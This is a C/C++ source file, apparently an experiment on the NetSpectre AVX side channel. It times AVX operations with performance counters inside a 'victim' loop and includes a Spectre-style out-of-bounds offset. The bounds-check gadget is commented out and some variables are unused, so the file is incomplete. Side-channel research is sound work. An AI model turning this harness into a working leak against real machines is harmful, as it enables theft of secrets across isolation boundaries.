#pragma GCC optimize("O0","unroll-loops","omit-frame-pointer","inline") //Optimization flags
#pragma GCC target("avx", "avx2")  //Enable AVX
#include <stdio.h>
#include <stdlib.h>
#include <immintrin.h>
#include <time.h>
#include <string.h>
#include "pfc.h"
#ifdef _MSC_VER // ms visual c
    #include <intrin.h>
    #pragma optimize("gt",on)
#else // gcc
    #include <x86intrin.h>
#endif

#ifndef SAMPLES
#define SAMPLES 1000
#endif

__attribute__((optimize("no-tree-vectorize"))) //Force disable auto-vectorization

char *mysecret1 = "I see NetSpectre by perfcounter";
char *mysecret2 = "Magic Words Squeamish Ossifrage";
size_t array[64];
char secretbit[1025];

__m256i v1, v2, v3;
unsigned int length = 64;

void netspectre(size_t x) {
    //int i;
    //if (x < length) {
        //if (array[x]) {
            //for (i = 0; i < SAMPLES; i++)
                v3 = _mm256_and_si256(v1, v2);
                v3 = _mm256_and_si256(v1, v2);
                v3 = _mm256_and_si256(v1, v2);
        //}
    //}
    /*
    asm("vmovdqa	v2(%rip), %ymm0");
	asm("vmovdqa	v1(%rip), %ymm1");
	asm("vmovdqa	%ymm1, -64(%rsp)");
	asm("vmovdqa	%ymm0, -32(%rsp)");
	asm("vmovdqa	-64(%rsp), %ymm1");
	asm("vmovdqa	-32(%rsp), %ymm0");
	asm("vpand	%ymm0, %ymm1, %ymm0");
	asm("vmovdqa	%ymm0, v3(%rip)");*/
}

void run_victim(size_t malicious_x) {
    pfc_reset();

    char result[1025];
    int tries, i, j, k, mix_i, junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (tries = 0; tries < 1000000; tries++) {
        
        
        asm volatile("CPUID");

        PFC_TIC;

        netspectre(x);

        PFC_TOC;

        asm volatile("CPUID");
    }

    pfc_print();
}

int main(){
    pfc_setup();
    
    v1 = _mm256_loadu_si256((__m256i *)&mysecret1[0]);
    v2 = _mm256_loadu_si256((__m256i *)&mysecret2[0]);
    char c[80];
    _mm256_storeu_si256((__m256i*) &c, v1);
    for (int i = 0; i < 32; i++)
        printf("%c", c[i]);
    printf("\n");

    srand(time(0));
    for (int i = 0; i < 1000; i++) {
        secretbit[i] = rand() & 1;
    }

    secretbit[0] = 1;

    //printf("%d\n", secretbit[0]);

    size_t malicious_x = (size_t)(secretbit - (char *)array);

    printf("%d\n", malicious_x);

    run_victim(malicious_x++);

    return 0;
}

// g++ netspectre.cpp pfc.cpp -o netspectre -no-pie